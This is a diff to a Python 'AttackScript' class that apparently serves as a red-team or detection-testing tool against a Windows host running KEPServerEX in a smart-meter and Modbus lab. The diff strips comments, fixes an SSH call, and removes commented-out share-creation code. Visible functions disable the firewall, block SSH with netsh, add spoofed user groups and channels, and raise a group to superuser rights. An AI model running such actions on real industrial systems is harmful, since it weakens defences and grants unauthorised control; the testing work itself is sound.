@@ -252,39 +252,6 @@ class AttackScript:
         except Exception:
             print("\nFail.\n")
 
-    # Create Shared Folder
-    # def create_shared_folder():
-    #     try:
-    #         folder_path = r'C:\Windows\temp\Smartmeter'
-
-    #         # Create the folder if it does not already exist
-    #         if not path.exists(folder_path):
-    #             mkdir(folder_path)
-
-    #         netshare = run(['net', 'share'], stdout=PIPE, stderr=PIPE, text=True)
-    #         if "SmartMeterfolder" in netshare.stdout:
-    #             print ("SmartMeterfolder has already been shared.")
-    #         else:
-    #             # Set the share information
-    #             share_name = 'SmartMeterfolder'
-    #             share_path = folder_path
-    #             share_remark = 'Shared folder for full access'
-
-    #             # Create the share
-    #             share_info = {
-    #                 'netname': share_name,
-    #                 'path': share_path,
-    #                 'remark': share_remark,
-    #                 'max_uses': -1,
-    #                 'current_uses': 0,
-    #                 'permissions': ACCESS_ALL,
-    #                 'security_descriptor': None
-    #             }
-    #             NetShareAdd(None, 2, share_info)
-    #             print ("SmartMeterfolder has been shared.")
-    #     except Exception as e:
-    #         print("\nFail.\n")
-
     def disable_firewall(self, revert: bool=False) -> None:
         """
         Turn off all three domains of the firewall
@@ -307,7 +274,7 @@ class AttackScript:
         Disable SSH from the firewall
         """
         count = 0
-        command_output = self.ssh_run_commandx(
+        command_output = self.ssh_run_command(
             'netsh advfirewall firewall add rule name="QRadar Test" dir=in action=block protocol=TCP localport=22')
         if "Ok." in command_output:
             count += 1
@@ -362,6 +329,7 @@ class AttackScript:
             cmd_output = self.ssh_run_command("taskkill /IM modpoll.exe /F")
             if "SUCCESS: " in cmd_output:
                 print("Successfully reverted attack!")
+                self.kep_server_start()
                 return
             else:
                 raise Exception("Either modpoll.exe doesn't exist or there is something wrong!")
@@ -1191,7 +1159,7 @@ class AttackScript:
         print(json.dumps(admin.users.get_user(server, user), indent=4), file=sys.stdout)
 
     def kep_modify_user(self, user, description, password,
-                        groupname):  ## ADDED to modify user requires three input from user - Description and Usergroup name and user to change and password
+                        groupname): 
         server = self.kep_connect()
         print(json.dumps(admin.users.modify_user(server, {"common.ALLTYPES_DESCRIPTION": description,
                                                           "libadminsettings.USERMANAGER_USER_GROUPNAME": groupname,
@@ -1199,25 +1167,25 @@ class AttackScript:
                                                  user=user), indent=4))
 
     def kep_add_user(self, user, groupname,
-                     password):  ## GIVE USER NOTE THAT PASSWORD NEEDS TO BE 14 characters or more
+                     password):  
         server = self.kep_connect()
         print(admin.users.add_user(server, {"common.ALLTYPES_NAME": user,
                                             "libadminsettings.USERMANAGER_USER_GROUPNAME": groupname,
                                             "libadminsettings.USERMANAGER_USER_PASSWORD": password}))
 
-    def kep_del_user(self, user):  ## ADDED to delete user
+    def kep_del_user(self, user): 
         server = self.kep_connect()
         print(admin.users.del_user(server, user))
 
-    def kep_add_user_group(self, usergroup):  ### ADDED to add spoofed user group
+    def kep_add_user_group(self, usergroup):  
         server = self.kep_connect()
         print(admin.user_groups.add_user_group(server, {"common.ALLTYPES_NAME": usergroup}))
 
-    def kep_del_user_group(self, usergroup):  ### ADDED to delete user group
+    def kep_del_user_group(self, usergroup):  
         server = self.kep_connect()
         print(admin.user_groups.del_user_group(server, usergroup))
 
-    def kep_upgrade_user_group(self, usergroup):  ### ADDED to let user modify user group to superuser
+    def kep_upgrade_user_group(self, usergroup):  
         server = self.kep_connect()
         print(admin.user_groups.modify_user_group(server, {"common.ALLTYPES_DESCRIPTION": "VERY SPECIAL GROUP",
                                                            "libadminsettings.USERMANAGER_IO_TAG_READ": "Enable",
@@ -1273,11 +1241,11 @@ class AttackScript:
                                                            "libadminsettings.USERMANAGER_SERVER_VIEW_EVENT_LOG_INFO": False},
                                                   user_group=usergroup))
 
-    def kep_get_all_user_groups(self):  ### ADDED to get all user groups
+    def kep_get_all_user_groups(self):  
         server = self.kep_connect()
         print(json.dumps(admin.user_groups.get_all_user_groups(server), indent=4))
 
-    def kep_get_single_user_group(self, usergroup):  ### ADDED to get single user group
+    def kep_get_single_user_group(self, usergroup):  
         server = self.kep_connect()
         print(json.dumps(admin.user_groups.get_user_group(server, usergroup), indent=4))
 
@@ -1291,16 +1259,16 @@ class AttackScript:
         server = self.kep_connect()
         print(json.dumps(connectivity.channel.get_channel(server, channel_name), indent=4))
 
-    def kep_add_spoofed_channel(self, channel_name):  ### Added to add spoofed channel
+    def kep_add_spoofed_channel(self, channel_name): 
         server = self.kep_connect()
         print(connectivity.channel.add_channel(server, {"common.ALLTYPES_NAME": channel_name,
                                                         "servermain.MULTIPLE_TYPES_DEVICE_DRIVER": "Modbus RTU Serial"}))
 
-    def kep_del_spoofed_channel(self, channel_name):  ### Added to del spoofed channel
+    def kep_del_spoofed_channel(self, channel_name):  
         server = self.kep_connect()
         print(connectivity.channel.del_channel(server, channel_name))
 
-    def kep_modify_channel(self, channel_name, new_channel_name):  ### Added to modify channel
+    def kep_modify_channel(self, channel_name, new_channel_name):  
         server = self.kep_connect()
         print(connectivity.channel.modify_channel(server, {"common.ALLTYPES_NAME": new_channel_name},
                                                   channel=channel_name, force=True))
@@ -1309,7 +1277,7 @@ class AttackScript:
         server = self.kep_connect()
         print(json.dumps(connectivity.device.get_all_devices(server, channel), indent=4))
 
-    def kep_get_single_device(self, channel, device):  # Example of a single device is "SmartMeter.ministicHACKED"
+    def kep_get_single_device(self, channel, device):  
         server = self.kep_connect()
         device_to_get = ".".join([channel, device])
         print(json.dumps(connectivity.device.get_device(server, device_to_get), indent=4))
@@ -1380,47 +1348,6 @@ class AttackScript:
         device_info = ".".join([channel, device])
         print(connectivity.device.auto_tag_gen(server, device_info, job_ttl=8))
 
-    # def kep_add_exchange(self, channel, device, ex_type, exchange_name):
-    #     server = self.kep_connect()
-    #     device_info = ".".join([channel, device])
-    #     print(json.dumps(connectivity.egd.exchange.add_exchange(server, channel, device_info, ex_type,
-    #                                                             {"common.ALL_TYPES_NAME": exchange_name}), indent=4))
-
-    # def kep_get_exchange(self, channel, device, ex_type, exchange_name):
-    #     server = self.kep_connect()
-    #     device_info = ".".join([channel, device])
-    #     print(json.dumps(connectivity.egd.exchange.get_exchange(server, device_info, ex_type, exchange_name), indent=4))
-
-    # def kep_delete_exchange(self, channel, device, ex_type, exchange_name):
-    #     server = self.kep_connect()
-    #     device_info = ".".join([channel, device])
-    #     print(json.dumps(connectivity.egd.exchange.del_exchange(server, device_info, ex_type, exchange_name), indent=4))
-
-    # def kep_add_name_resolution(self, channel, device, resolution_name):
-    #     server = self.kep_connect()
-    #     device_info = ".".join([channel, device])
-    #     print(json.dumps(
-    #         connectivity.egd.name.add_name_resolution(server, device_info, {"common.ALLTYPES_NAME": resolution_name}),
-    #         indent=4))
-
-    # def kep_delete_name_resolution(self, channel, device, resolution_name):
-    #     server = self.kep_connect()
-    #     device_info = ".".join([channel, device])
-    #     print(json.dumps(connectivity.egd.name.del_name_resolution(server, device_info, resolution_name), indent=4))
-
-    # def kep_modify_name_resolution(self, channel, device, alias, ip_addr, resolution_name):
-    #     server = self.kep_connect()
-    #     device_info = ".".join([channel, device])
-    #     print(json.dumps(connectivity.egd.name.modify_name_resolution(server, device_info, {
-    #         "ge_ethernet_global_data.NAME_RESOLUTION_ALIAS": alias,
-    #         "ge_ethernet_global_data.NAME_RESOLUTION_IP_ADDRESS": ip_addr}), name= resolution_name, indent=4))
-    #     print(json.dumps(connectivity.egd.name.get_name_resolution(server, device_info), indent=4))
-
-    # def kep_get_name_resolution(self, channel, device):
-    #     server = self.kep_connect()
-    #     device_info = ".".join([channel, device])
-    #     print(json.dumps(connectivity.egd.name.get_name_resolution(server, device_info), indent=4))
-
     def kep_add_udd_profile(self, profile_name, description):
         server = self.kep_connect()
         print(json.dumps(connectivity.udd.profile.add_profile(server, {"common.ALLTYPES_NAME": profile_name,
@@ -1441,23 +1368,6 @@ class AttackScript:
                                                                           "common.ALLTYPES_DESCRIPTION": description}),
                          indent=4))
         print(json.dumps(connectivity.udd.profile.get_profile(server, profile_name), indent=4))
-
-    # def kep_add_log_item(self, log_group, log_item):
-    #     server = self.kep_connect()
-    #     print(json.dumps(datalogger.log_items.add_log_item(server, log_group="Derrick", log_item="WHYNOT"),
-    #                      indent=4))
-
-    # def kep_get_all_log_items(self):
-    #     server = self.kep_connect()
-    #     print(json.dumps(datalogger.log_items.get_all_log_items(server, log_group="asd"), indent=4))
-
-    # def kep_get_log_item(self, log_group, log_item):
-    #     server = self.kep_connect()
-    #     print(json.dumps(datalogger.log_items.get_log_item(server, log_group="Derrick", log_item="1"), indent=4))
-
-    # def kep_delete_log_item(self, log_group, log_item):
-    #     server = self.kep_connect()
-    #     print(json.dumps(datalogger.log_items.del_log_item(server, log_group, log_item), indent=4))
         
     def kep_add_log_group(self, log_group, description):
         server = self.kep_connect()
@@ -1488,12 +1398,6 @@ class AttackScript:
     def kep_get_log_group(self, log_group_name):
         server = self.kep_connect()
         print(json.dumps(datalogger.log_group.get_log_group(server, log_group_name), indent=4))
-
-    # def kep_modify_project_properties(self,project_name):
-    #     server = self.kep_connect()
-    #     print(json.dumps(connection.server.modify_project_properties(server, {"common.ALLTYPES_NAME": project_name}),
-    #                      indent=4))
-    #     print(json.dumps(connection.server.get_project_properties(server), indent=4))
 
     def disable_running_schedules(self, revert: bool=False) -> None:
         """
